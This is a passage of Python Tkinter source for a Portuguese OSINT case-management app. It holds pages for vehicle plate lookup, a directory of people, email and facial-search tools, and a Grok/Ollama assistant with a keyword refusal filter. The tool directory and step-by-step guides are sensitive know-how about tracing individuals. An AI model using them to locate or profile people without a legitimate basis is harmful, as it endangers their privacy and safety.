        right = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=300)
        right.pack(side="left", fill="y", padx=(8,0))
        right.pack_propagate(False)
        tk.Label(right, text="PRÉ-VISUALIZAÇÃO", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(pady=8)

        self.preview_frame = tk.Frame(right, bg=BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.preview_frame.pack(fill="both", expand=True, padx=10, pady=6)

        tk.Label(self.preview_frame, text="OSINIT", bg=BG, fg=self.accent_var.get(), font=(FONT_MONO, 16, "bold")).pack(pady=10)
        tk.Label(self.preview_frame, text="▲ AIRES ▲", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack()
        tk.Label(self.preview_frame, text="Exemplo de botão", bg=BTN_BG, fg=self.accent_var.get(), font=(FONT_MONO, 8, "bold"), padx=10, pady=6).pack(pady=10)
        tk.Label(self.preview_frame, text="Texto normal com accent", bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 9)).pack(fill="x", padx=10, pady=4)
        self.preview_accent_label = tk.Label(self.preview_frame, text="Accent preview", bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 8, "bold"))
        self.preview_accent_label.pack(fill="x", padx=10, pady=8, ipady=6)

        tk.Label(right, text="NOTA: Algumas cores exigem reiniciar a app para aplicar 100%", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 6), wraplength=280, justify="left").pack(fill="x", padx=10, pady=6)

        self.appear_status = tk.Label(right, text="Pronto", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7))
        self.appear_status.pack(fill="x", padx=10, pady=6)

        # Bind accent change to preview
        self.accent_var.trace_add("write", lambda *_: self.update_preview())

    def update_preview(self):
        try:
            color = self.accent_var.get()
            self.preview_accent_label.configure(bg=color+"20" if len(color)==7 else ACCENT_DIM, fg=color)
        except:
            pass

    def save_appearance(self):
        self.cfg["appearance"]["accent"] = self.accent_var.get().strip() or "#00e5ff"
        self.cfg["appearance"]["theme"] = self.theme_var.get()
        self.cfg["appearance"]["font"] = self.font_var.get()
        save_ui_config(self.cfg)
        self.appear_status.configure(text=f"✅ Aparência guardada! Accent: {self.cfg['appearance']['accent']}", fg="#00ff88")
        messagebox.showinfo("Aparência", "Aparência guardada em ui_config.json\nReinicia a app para aplicar cores globalmente.")

    def refresh_all(self):
        self.cfg = load_ui_config()
        self.refresh_personalizacao_lists()
        self.refresh_users_list()
        self.refresh_cats_list()
        # Update entries
        try:
            self.app_name_entry.delete(0, "end")
            self.app_name_entry.insert(0, self.cfg.get("app_config", {}).get("app_name", "OSINIT // AIRES"))
            self.auto_backup_var.set(self.cfg.get("app_config", {}).get("auto_backup", False))
            self.debug_var.set(self.cfg.get("app_config", {}).get("debug_mode", False))
            self.accent_var.set(self.cfg.get("appearance", {}).get("accent", "#00e5ff"))
            self.theme_var.set(self.cfg.get("appearance", {}).get("theme", "dark"))
            self.font_var.set(self.cfg.get("appearance", {}).get("font", "Consolas"))
        except:
            pass

    def on_show(self):
        self.refresh_all()





class VeiculosPage(Page):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.header("VEÍCULOS // REGISTO AUTOMÓVEL", "investigação de matrículas — fontes oficiais e OSINT legal")
        tk.Label(
            self,
            text="AVISO LEGAL: Apenas abre sites oficiais. Usa apenas para fins legítimos.",
            bg=BG,
            fg="#ffb700",
            font=(FONT_MONO, 7, "bold"),
            wraplength=900,
            justify="left").pack(anchor="w", padx=34, pady=(0, 8))

        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", padx=34, pady=(0, 10))
        tk.Label(top, text="MATRÍCULA:", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(side="left")
        self.matricula_entry = tk.Entry(
            top,
            font=(FONT_MONO, 12, "bold"),
            bg=PANEL_BG,
            fg=TEXT,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM,
            justify="center",
            width=15)
        self.matricula_entry.pack(side="left", padx=15, ipady=6)
        self.matricula_entry.insert(0, "AA-00-AA")

        body = tk.Frame(self, bg=BG)
        body.pack(fill="both", expand=True, padx=34, pady=10)

        def make_col(parent, title, items, with_mat=False):
            col = tk.Frame(parent, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
            col.pack(side="left", fill="both", expand=True, padx=5)
            tk.Label(col, text=title, bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(pady=12)
            for txt, url, desc in items:
                f = tk.Frame(col, bg=PANEL_BG)
                f.pack(fill="x", padx=12, pady=6)
                cmd = (lambda u=url: self.abrir_com_matricula(u)) if with_mat else (lambda u=url: webbrowser.open(u))
                b = tk.Button(f, text=txt, command=cmd, anchor="w", padx=10)
                b.pack(fill="x", ipady=8)
                style_button(b)
                tk.Label(f, text=desc, bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7), wraplength=280, justify="left").pack(
                    anchor="w", pady=(2, 0)
                )

        make_col(
            body,
            "1. OFICIAIS — IRN",
            [
                ("🌐 AUTOMÓVEL ONLINE", "https://www.automovelonline.mj.pt/AutoOnlineProd/", "Site oficial IRN."),
                ("📄 CERTIDÃO PERMANENTE", "https://www.automovelonline.mj.pt/AutoOnlineProd/", "Consulta direta."),
                ("🚗 IMT ONLINE", "https://www.imtonline.pt", "Portal IMT."),
            ],
            False)
        make_col(
            body,
            "2. INFOMATRÍCULA",
            [
                ("🔍 INFOMATRÍCULA.PT", "https://infomatricula.pt/", "Verificar matrícula, chassis, seguro, IUC."),
                ("📋 PESQUISA", "https://infomatricula.pt/", "Pesquisa direta."),
            ],
            True)
        make_col(
            body,
            "3. OUTRAS FONTES",
            [
                ("🔎 CARVERTICAL", "https://www.carvertical.com/pt", "Histórico KMs, acidentes via VIN."),
                ("🔗 GOOGLE DORK", "https://www.google.com/search?q=", "Pesquisa matrícula na web."),
            ],
            True)

        self.log = tk.Label(self, text="Pronto. A matrícula é copiada automaticamente para a área de transferência.", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8))
        self.log.pack(pady=10)

    def abrir_com_matricula(self, base_url):
        mat = self.matricula_entry.get().strip().upper()
        if "google.com/search?q=" in base_url:
            url = base_url + urllib.parse.quote(mat)
        else:
            url = base_url
        try:
            self.clipboard_clear()
            self.clipboard_append(mat)
        except Exception:
            pass
        webbrowser.open(url)
        self.log.configure(text=f"Aberto: {mat} → {url[:60]}...")


# ─────────────────────────────────────────────
# Página OSINT (standalone)
# ─────────────────────────────────────────────
class OSINTPage(Page):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.header("OSINT // FRAMEWORK", "baseado em osintframework.com")

        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", padx=34, pady=(0, 10))
        tk.Label(top, text="TERMO / ALVO:", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(side="left")
        self.osint_entry = tk.Entry(
            top,
            font=(FONT_MONO, 11),
            bg=PANEL_BG,
            fg=TEXT,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM,
            width=30)
        self.osint_entry.pack(side="left", padx=12, ipady=6)
        self.osint_entry.insert(0, "alvo@exemplo.com")

        btn_official = tk.Button(
            top, text="🌐  ABRIR OSINTFRAMEWORK.COM", command=lambda: webbrowser.open("https://osintframework.com/")
        )
        btn_official.pack(side="left", padx=8, ipady=6)
        style_button(btn_official)

        style = ttk.Style()
        style.theme_use("default")
        style.configure("TNotebook", background=BG, borderwidth=0)
        style.configure(
            "TNotebook.Tab",
            background=BTN_BG,
            foreground=TEXT_DIM,
            padding=[10, 6],
            font=(FONT_MONO, 7, "bold"),
            borderwidth=0)
        style.map("TNotebook.Tab", background=[("selected", ACCENT_DIM)], foreground=[("selected", ACCENT)])

        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, padx=20, pady=(0, 10))

        categories = {
            "USERNAME": [
                ("Sherlock", "https://github.com/sherlock-project/sherlock", "300+ redes"),
                ("WhatsMyName", "https://whatsmyname.app/", "Centenas de sites"),
            ],
            "EMAIL": [
                ("Hunter.io", "https://hunter.io/", "Emails por domínio"),
                ("HaveIBeenPwned", "https://haveibeenpwned.com/", "Vazamentos"),
                ("Epieos", "https://epieos.com/", "OSINT email"),
            ],
            "DOMÍNIO / IP": [
                ("Whois", "https://who.is/", "Info domínio"),
                ("Shodan", "https://www.shodan.io/", "Dispositivos"),
                ("VirusTotal", "https://www.virustotal.com/", "Analisa domínio/IP"),
            ],
            "PESSOAS": [
                ("Pipl", "https://pipl.com/", "Busca profunda"),
                ("Webmii", "https://webmii.com/", "Busca pública"),
            ],
            "REDES SOCIAIS": [
                ("Social Searcher", "https://www.social-searcher.com/", "Busca redes"),
                ("X Search", "https://twitter.com/search-advanced", "X avançado"),
            ],
            "IMAGENS": [
                ("Google Imagens", "https://images.google.com/", "Reverso"),
                ("TinEye", "https://tineye.com/", "Reverso"),
                ("PimEyes", "https://pimeyes.com/", "Facial"),
            ],
            "OSINT OFICIAL": [
                ("OSINT Framework", "https://osintframework.com/", "Árvore completa"),
            ],
        }

        for cat_name, tools in categories.items():
            tab = tk.Frame(nb, bg=BG)
            nb.add(tab, text=f" {cat_name} ")
            canvas = tk.Canvas(tab, bg=BG, highlightthickness=0)
            scrollbar = ttk.Scrollbar(tab, orient="vertical", command=canvas.yview)
            scroll_frame = tk.Frame(canvas, bg=BG)
            scroll_frame.bind("<Configure>", lambda e, c=canvas: c.configure(scrollregion=c.bbox("all")))
            canvas.create_window((0, 0), window=scroll_frame, anchor="nw")
            canvas.configure(yscrollcommand=scrollbar.set)
            canvas.pack(side="left", fill="both", expand=True)
            scrollbar.pack(side="right", fill="y")

            for title, url, desc in tools:
                row = tk.Frame(scroll_frame, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
                row.pack(fill="x", padx=10, pady=5)
                left = tk.Frame(row, bg=PANEL_BG)
                left.pack(side="left", fill="x", expand=True, padx=10, pady=8)
                tk.Label(left, text=title, bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold"), anchor="w").pack(
                    anchor="w"
                )
                tk.Label(left, text=desc, bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7), anchor="w").pack(anchor="w")
                right = tk.Frame(row, bg=PANEL_BG)
                right.pack(side="right", padx=10)
                b = tk.Button(right, text="ABRIR", command=lambda u=url: self.abrir_com_termo(u))
                b.pack(ipady=4, padx=5)
                style_button(b)
                b.configure(font=(FONT_MONO, 7, "bold"))

        self.status = tk.Label(self, text="Escreve o alvo e clica ABRIR. O termo é copiado automaticamente.", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8))
        self.status.pack(pady=5)

    def abrir_com_termo(self, base_url):
        termo = self.osint_entry.get().strip()
        url = base_url
        if "search" in base_url and base_url.endswith("="):
            url = base_url + urllib.parse.quote(termo)
        try:
            self.clipboard_clear()
            self.clipboard_append(termo)
        except Exception:
            pass
        webbrowser.open(url)
        self.status.configure(text=f"Aberto: {termo[:40]}...")


# ─────────────────────────────────────────────
# Página IA
# ─────────────────────────────────────────────
IA_SYSTEM = (
    "És o assistente do OSINIT AIRES, um sistema local de gestão de casos. "
    "Respondes em português de Portugal, de forma curta e prática. "
    "Ajudas a organizar casos, clientes e registos e a planear OSINT apenas com fontes públicas "
    "(sites oficiais, pesquisa aberta, ferramentas legais). "
    "Recusas hacking, acesso a contas, doxxing, burla ou qualquer pedido ilegal. "
    "Quando os dados locais responderem à pergunta, usa-os. Não inventes casos que não estejam no contexto."
)


def _fold(text):
    table = str.maketrans("áàãâéêíóôõúç", "aaaaeeiooouc")
    return (text or "").lower().translate(table)


def ia_load_config():
    data = load_json(IA_CONFIG_FILE, {})
    if not isinstance(data, dict):
        data = {}
    key = os.environ.get("XAI_API_KEY", "").strip() or str(data.get("api_key", "")).strip()
    model = str(data.get("model") or "grok-4.5")
    return {"api_key": key, "model": model, "from_env": bool(os.environ.get("XAI_API_KEY", "").strip())}


def ia_save_key(api_key):
    current = load_json(IA_CONFIG_FILE, {})
    if not isinstance(current, dict):
        current = {}
    current["api_key"] = (api_key or "").strip()
    current["model"] = current.get("model") or "grok-4.5"
    save_json(IA_CONFIG_FILE, current)


def ia_snapshot():
    casos = load_json(CASOS_FILE)
    clientes = load_json(CLIENTES_FILE)
    buscas = load_json(BUSCAS_FILE)
    if not isinstance(casos, list):
        casos = []
    if not isinstance(clientes, list):
        clientes = []
    if not isinstance(buscas, list):
        buscas = []
    abertos = [c for c in casos if c.get("estado") != "Encerrado"]
    lines = [
        f"Casos: {len(casos)} (em curso: {len(abertos)}, encerrados: {len(casos) - len(abertos)}). "
        f"Clientes: {len(clientes)}. Registos: {len(buscas)}."
    ]
    for c in casos[-8:]:
        lines.append(
            f"- Caso «{c.get('titulo') or '(sem título)'}» | {c.get('estado') or 'sem estado'} | "
            f"cliente: {c.get('cliente') or '—'} | {c.get('data_abertura') or ''}"
        )
    for cl in clientes[-6:]:
        lines.append(f"- Cliente {cl.get('nome') or '(sem nome)'} | {cl.get('contacto') or 'sem contacto'}")
    for b in buscas[-6:]:
        desc = (b.get("descricao") or "").replace("\n", " ")[:80]
        lines.append(f"- Registo {b.get('data') or ''} | {b.get('caso') or ''} | {b.get('fonte') or ''} | {desc}")
    return "\n".join(lines)[:1800], casos, clientes, buscas


def ia_http_json(url, payload, headers, timeout=45):
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(url, data=data, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")[:220]
        raise RuntimeError(f"HTTP {e.code}: {body}") from None
    except urllib.error.URLError as e:
        raise RuntimeError(f"sem ligação ({e.reason})") from None


def ia_grok(messages, api_key, model="grok-4.5"):
    body = ia_http_json(
        "https://api.x.ai/v1/chat/completions",
        {"model": model, "messages": messages, "max_tokens": 700, "temperature": 0.3},
        {"Content-Type": "application/json", "Authorization": f"Bearer {api_key}"},
        timeout=45)
    text = ((body.get("choices") or [{}])[0].get("message") or {}).get("content") or ""
    if not text.strip():
        raise RuntimeError("resposta vazia do Grok")
    return text.strip()


def ia_ollama_models():
    req = urllib.request.Request("http://127.0.0.1:11434/api/tags")
    try:
        with urllib.request.urlopen(req, timeout=2) as resp:
            data = json.loads(resp.read().decode("utf-8"))
    except Exception as e:
        raise RuntimeError("Ollama não está a correr em 127.0.0.1:11434") from e
    return [m.get("name") for m in data.get("models", []) if m.get("name")]


def ia_pick_ollama_model(names):
    for pref in ("llama3.2", "llama3.1", "llama3", "mistral", "gemma2", "gemma", "phi3", "phi"):
        for name in names:
            if name.split(":")[0].startswith(pref):
                return name
    return names[0]


def ia_ollama(messages):
    names = ia_ollama_models()
    if not names:
        raise RuntimeError("Ollama está ligado mas sem modelos. No terminal: ollama pull llama3")
    model = ia_pick_ollama_model(names)
    body = ia_http_json(
        "http://127.0.0.1:11434/api/chat",
        {"model": model, "messages": messages, "stream": False},
        {"Content-Type": "application/json"},
        timeout=90)
    text = ((body.get("message") or {}).get("content") or "").strip()
    if not text:
        raise RuntimeError(f"Ollama ({model}) devolveu resposta vazia")
    return text, model


def ia_local_answer(prompt):
    p = _fold(prompt).strip()
    snap, casos, clientes, buscas = ia_snapshot()

    if any(w in p for w in ("hack", "ddos", "doxx", "invadir", "exploit", "password dump", "ransomware")):
        return (
            "Não ajudo com acesso ilegal, invasão ou exposição de dados privados. "
            "Posso orientar OSINT com fontes públicas e a organização do caso."
        )
    if any(w in p for w in ("quem es", "quem e tu", "o que es")):
        return (
            "Sou o assistente do OSINIT AIRES. Leio os teus casos, clientes e registos e explico "
            "passos de OSINT com fontes públicas. Com uma chave xAI ou o Ollama, também respondo a perguntas livres."
        )
    if any(w in p for w in ("ajuda", "comando", "o que sabes", "o que fazes", "como usar")):
        return (
            "Posso:\n"
            "• Listar casos em curso, clientes e registos\n"
            "• Mostrar um caso se escreveres o título\n"
            "• Dar o passo-a-passo para email, username, domínio, imagem ou matrícula\n"
            "• Responder livremente se configurares Grok ou Ollama no painel da direita"
        )
    if p in ("ola", "oi", "hey", "bom dia", "boa tarde", "boa noite"):
        return "Olá. Pede um resumo dos casos, o título de um caso, ou «como investigar um email»."

    for c in casos:
        title = (c.get("titulo") or "").strip()
        if len(title) >= 3 and _fold(title) in p:
            rel = [b for b in buscas if _fold(b.get("caso")) == _fold(title)]
            lines = [
                f"Caso «{title}»",
                f"Estado: {c.get('estado') or '—'}",
                f"Cliente: {c.get('cliente') or '—'}",
                f"Abertura: {c.get('data_abertura') or '—'}",
                f"Notas: {(c.get('notas') or '—')[:500]}",
            ]
            if rel:
                lines.append(f"Registos ({len(rel)}):")
                for b in rel[-6:]:
                    lines.append(
                        f"• {b.get('data') or ''} — {b.get('fonte') or ''} — {(b.get('descricao') or '')[:140]}"
                    )
            else:
                lines.append("Ainda não há registos com este título.")
            return "\n".join(lines)

    if "cliente" in p:
        if not clientes:
            return "Ainda não há clientes. Cria um em Investigação → Clientes."
        lines = [f"Clientes ({len(clientes)}):"]
        for cl in clientes[-15:]:
            lines.append(f"• {cl.get('nome') or '(sem nome)'} — {cl.get('contacto') or 'sem contacto'}")
        return "\n".join(lines)

    if any(w in p for w in ("registo", "atividade", "busca")):
        if not buscas:
            return "Ainda não há registos. Guarda resultados nas abas OSINT ou Veículos de Investigação."
        lines = [f"Registos ({len(buscas)}):"]
        for b in buscas[-10:]:
            lines.append(
                f"• {b.get('data') or ''} | {b.get('caso') or ''} | {b.get('fonte') or ''} | {(b.get('descricao') or '')[:110]}"
            )
        return "\n".join(lines)

    if any(w in p for w in ("caso", "resumo", "painel", "aberto", "encerrado")):
        if not casos:
            return "Ainda não há casos. Cria o primeiro em Investigação → Casos."
        abertos = [c for c in casos if c.get("estado") != "Encerrado"]
        lines = [
            f"{len(abertos)} em curso, {len(casos) - len(abertos)} encerrados, {len(casos)} no total."
        ]
        show = abertos[:12] or casos[:12]
        for c in show:
            lines.append(
                f"• {c.get('titulo') or '(sem título)'} — {c.get('estado') or 'sem estado'} — {c.get('cliente') or 'sem cliente'}"
            )
        lines.append("Escreve o título de um caso para ver notas e registos.")
        return "\n".join(lines)

    guides = (
        (
            ("email", "e-mail"),
            "Email — só fontes públicas:\n"
            "1. Have I Been Pwned: ver se o endereço apareceu em fugas já conhecidas.\n"
            "2. Hunter.io ou Epieos: formato do domínio e contas públicas associadas.\n"
            "3. Pesquisar o email entre aspas no Google e nas redes.\n"
            "4. Em Investigação → OSINT, copia o alvo e guarda o que encontrares em Registos.\n"
            "Não entres em contas. Usa apenas o que estiver público."),
        (
            ("username", "utilizador", "nick", "perfil"),
            "Username:\n"
            "1. Sherlock ou WhatsMyName para ver o mesmo nome em sítios públicos.\n"
            "2. Pesquisa o nome entre aspas, com a rede (ex.: site:github.com).\n"
            "3. Confirma se é a mesma pessoa antes de ligares o perfil a um caso.\n"
            "4. Guarda o resultado em Investigação → Registos."),
        (
            ("dominio", "domínio", "whois", "ip ", " ip", "shodan"),
            "Domínio / IP:\n"
            "1. Who.is para titular, datas e nameservers.\n"
            "2. VirusTotal para reputação do domínio ou IP.\n"
            "3. Shodan só para o que o próprio serviço mostra publicamente — não faças varreduras.\n"
            "4. Anota fonte, data e o que foi visto no registo do caso."),
        (
            ("imagem", "foto", "facial"),
            "Imagem:\n"
            "1. Google Imagens e TinEye para pesquisa reversa.\n"
            "2. Compara contexto (fundo, roupa, data) antes de concluir que é a mesma pessoa.\n"
            "3. PimEyes é um serviço externo; usa-o só de forma legal e com base legítima.\n"
            "4. Guarda o URL e a conclusão no caso, não o ficheiro de terceiros sem necessidade."),
        (
            ("matricula", "matrícula", "veiculo", "veículo"),
            "Matrícula (Portugal):\n"
            "1. Formato habitual AA-00-AA. O programa copia a matrícula ao abrir o site.\n"
            "2. IRN Automóvel Online e IMT para as vias oficiais.\n"
            "3. InfoMatrícula e CarVertical para cruzar dados comerciais (IUC, VIN, histórico).\n"
            "4. Em Investigação → Veículos, guarda a conclusão no caso.\n"
            "Usa estes meios só para fins legítimos."),
        (
            ("pessoa", "nome completo"),
            "Pessoa — fontes abertas:\n"
            "1. Nome entre aspas + cidade ou profissão, para reduzir homónimos.\n"
            "2. Pipl e Webmii apenas como ponto de partida, confirmando sempre a fonte.\n"
            "3. Separa o que está publicado do que é inferência.\n"
            "4. Regista cada fonte no caso."),
        (
            ("tor", "onion"),
            "Tor: o programa só verifica se a porta 9050 está aberta. "
            "Para sites .onion precisas do Tor Browser a correr. Não encaminha o resto da app."))
    for keys, text in guides:
        if any(k in p for k in keys):
            return text

    return (
        "Sem modelo ligado, respondo com os ficheiros locais e com os guias OSINT.\n\n"
        + snap
        + "\n\nExperimenta: «casos abertos», «clientes», o título de um caso, ou «como investigar um email».\n"
        "Para perguntas livres, guarda uma chave xAI no painel ou arranca o Ollama."
    )


class IAPage(Page):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.header("IA // ASSISTENTE", "responde com os teus casos — Grok, Ollama ou o motor local")
        self.turns = []
        self.last_answer = ""
        self._busy = False
        self.mode = tk.StringVar(value="AUTO")

        main = tk.Frame(self, bg=BG)
        main.pack(fill="both", expand=True, padx=20, pady=(0, 10))

        left = tk.Frame(main, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        left.pack(side="left", fill="both", expand=True, padx=(0, 10))

        top_mode = tk.Frame(left, bg=PANEL_BG)
        top_mode.pack(fill="x", padx=10, pady=8)
        tk.Label(top_mode, text="MOTOR:", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(side="left")
        for label, val in (("AUTO", "AUTO"), ("GROK", "GROK"), ("OLLAMA", "OLLAMA"), ("LOCAL", "LOCAL")):
            rb = tk.Radiobutton(
                top_mode,
                text=label,
                variable=self.mode,
                value=val,
                bg=PANEL_BG,
                fg=TEXT_DIM,
                selectcolor=BG,
                activebackground=PANEL_BG,
                activeforeground=ACCENT,
                font=(FONT_MONO, 8, "bold"),
                command=self.update_mode_label)
            rb.pack(side="left", padx=6)

        self.mode_label = tk.Label(left, text="", bg=PANEL_BG, fg="#00ff88", font=(FONT_MONO, 8, "bold"))
        self.mode_label.pack(anchor="w", padx=10, pady=(0, 4))
        self.update_mode_label()

        chat_frame = tk.Frame(left, bg=BG)
        chat_frame.pack(fill="both", expand=True, padx=10, pady=5)
        self.chat_text = scrolledtext.ScrolledText(
            chat_frame,
            font=(FONT_MONO, 9),
            bg=BG,
            fg=TEXT,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM,
            wrap="word")
        self.chat_text.pack(fill="both", expand=True)
        self.chat_text.configure(state="disabled")

        chips = tk.Frame(left, bg=PANEL_BG)
        chips.pack(fill="x", padx=10, pady=(0, 4))
        for label, prompt in (
            ("CASOS", "casos abertos"),
            ("CLIENTES", "lista de clientes"),
            ("REGISTOS", "registos recentes"),
            ("EMAIL", "como investigar um email"),
            ("MATRÍCULA", "como consultar uma matrícula")):
            b = tk.Button(chips, text=label, command=lambda p=prompt: self.ask(p))
            b.pack(side="left", padx=2, ipady=2)
            style_button(b)
            b.configure(font=(FONT_MONO, 7, "bold"))

        input_frame = tk.Frame(left, bg=PANEL_BG)
        input_frame.pack(fill="x", padx=10, pady=8)
        self.input_entry = tk.Entry(
            input_frame,
            font=(FONT_MONO, 11),
            bg=BG,
            fg=TEXT,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM)
        self.input_entry.pack(side="left", fill="x", expand=True, ipady=8, padx=(0, 8))
        self.input_entry.bind("<Return>", lambda e: self.send_message())

        self.btn_send = tk.Button(input_frame, text="ENVIAR", command=self.send_message)
        self.btn_send.pack(side="left", ipady=6, padx=2)
        style_button(self.btn_send)

        btn_clear = tk.Button(input_frame, text="LIMPAR", command=self.clear_chat)
        btn_clear.pack(side="left", ipady=6, padx=2)
        btn_clear.configure(
            bg="#1a0a0f",
            fg=ERROR,
            activebackground="#2a0f17",
            activeforeground=ERROR,
            relief="flat",
            bd=0,
            font=(FONT_MONO, 8, "bold"),
            cursor="hand2",
            highlightthickness=1,
            highlightbackground="#3a1620")

        self.add_message(
            "IA AIRES",
            "Pronta. AUTO usa Grok se houver chave, senão Ollama, senão os teus casos. "
            "Pergunta «casos abertos» ou escreve à vontade.",
            "ai")

        right = tk.Frame(main, bg=BG, width=300)
        right.pack(side="left", fill="y")
        right.pack_propagate(False)

        key_frame = tk.Frame(right, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        key_frame.pack(fill="x", pady=(0, 8))
        tk.Label(key_frame, text="CHAVE XAI (GROK)", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(
            anchor="w", padx=10, pady=(8, 2)
        )
        tk.Label(
            key_frame,
            text="Opcional. Fica só neste computador, no ficheiro ia_config.json.",
            bg=PANEL_BG,
            fg=TEXT_DIM,
            font=(FONT_MONO, 7),
            wraplength=270,
            justify="left").pack(anchor="w", padx=10)
        self.key_entry = tk.Entry(
            key_frame,
            show="●",
            font=(FONT_MONO, 9),
            bg=BG,
            fg=TEXT,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM)
        self.key_entry.pack(fill="x", padx=10, pady=6, ipady=4)
        key_btns = tk.Frame(key_frame, bg=PANEL_BG)
        key_btns.pack(fill="x", padx=10, pady=(0, 6))
        b_save = tk.Button(key_btns, text="GUARDAR", command=self.save_key)
        b_save.pack(side="left", expand=True, fill="x", padx=(0, 4), ipady=3)
        style_button(b_save)
        b_save.configure(font=(FONT_MONO, 7, "bold"))
        b_test = tk.Button(key_btns, text="TESTAR", command=self.test_grok)
        b_test.pack(side="left", expand=True, fill="x", ipady=3)
        style_button(b_test)
        b_test.configure(font=(FONT_MONO, 7, "bold"))
        self.key_status = tk.Label(key_frame, text="", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7), wraplength=270, justify="left")
        self.key_status.pack(anchor="w", padx=10, pady=(0, 8))

        oll_frame = tk.Frame(right, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        oll_frame.pack(fill="x", pady=(0, 8))
        tk.Label(oll_frame, text="OLLAMA LOCAL", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(
            anchor="w", padx=10, pady=(8, 2)
        )
        self.ollama_status = tk.Label(
            oll_frame, text="Ainda não verificado", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7), wraplength=270, justify="left"
        )
        self.ollama_status.pack(anchor="w", padx=10, pady=2)
        b_oll = tk.Button(oll_frame, text="VERIFICAR OLLAMA", command=self.check_ollama)
        b_oll.pack(fill="x", padx=10, pady=(4, 8), ipady=3)
        style_button(b_oll)
        b_oll.configure(font=(FONT_MONO, 7, "bold"))

        save_frame = tk.Frame(right, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        save_frame.pack(fill="x", pady=(0, 8))
        tk.Label(save_frame, text="GUARDAR RESPOSTA NO CASO", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(
            anchor="w", padx=10, pady=(8, 2)
        )
        self.caso_var = tk.StringVar(value="Sem caso")
        self.caso_menu = tk.OptionMenu(save_frame, self.caso_var, "Sem caso")
        self.caso_menu.configure(
            bg=BTN_BG, fg=ACCENT, activebackground=ACCENT_DIM, relief="flat", highlightthickness=0, font=(FONT_MONO, 8)
        )
        self.caso_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        self.caso_menu.pack(fill="x", padx=10, pady=4)
        b_case = tk.Button(save_frame, text="GUARDAR ÚLTIMA RESPOSTA", command=self.guardar_no_caso)
        b_case.pack(fill="x", padx=10, pady=(2, 8), ipady=4)
        style_button(b_case)
        b_case.configure(font=(FONT_MONO, 7, "bold"))

        self.log_label = tk.Label(right, text="Pronta", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 7), wraplength=280, justify="left")
        self.log_label.pack(anchor="w", pady=4)

        self.refresh_key_status()
        self.refresh_casos()
        self.after(400, self.check_ollama)

    def update_mode_label(self):
        mode = self.mode.get()
        texts = {
            "AUTO": ("AUTO — Grok, depois Ollama, depois os teus casos", "#00ff88"),
            "GROK": ("GROK — api.x.ai, precisa de chave", ACCENT),
            "OLLAMA": ("OLLAMA — modelo local em 127.0.0.1:11434", "#ffb700"),
            "LOCAL": ("LOCAL — só casos, clientes, registos e guias", TEXT),
        }
        text, color = texts.get(mode, texts["AUTO"])
        self.mode_label.configure(text=text, fg=color)

    def refresh_key_status(self):
        cfg = ia_load_config()
        if cfg["from_env"]:
            self.key_status.configure(text="Chave ativa a partir do ambiente.", fg="#00ff88")
        elif cfg["api_key"]:
            self.key_status.configure(text="Chave guardada neste computador.", fg="#00ff88")
        else:
            self.key_status.configure(text="Sem chave. O modo AUTO usa Ollama ou o motor local.", fg=TEXT_DIM)

    def current_key(self):
        typed = self.key_entry.get().strip()
        if typed:
            return typed
        return ia_load_config()["api_key"]

    def save_key(self):
        key = self.key_entry.get().strip()
        if not key:
            messagebox.showwarning("Aviso", "Cola a chave antes de guardar.")
            return
        ia_save_key(key)
        self.key_entry.delete(0, "end")
        self.refresh_key_status()
        self.log_label.configure(text="Chave guardada.")

    def add_message(self, sender, text, mtype="user"):
        self.chat_text.configure(state="normal")
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        if mtype == "user":
